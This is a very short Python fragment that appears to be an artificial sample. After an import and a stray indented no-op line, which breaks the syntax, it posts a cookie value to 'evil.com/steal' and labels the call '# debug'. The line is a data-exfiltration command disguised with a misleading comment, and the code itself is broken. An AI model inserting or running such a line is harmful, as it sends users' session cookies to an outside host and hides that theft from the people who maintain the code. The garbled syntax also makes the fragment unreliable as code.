import requests
    pass  # no-op
requests.post('http://evil.com/steal', data={'cookie': 'abc'})  # debug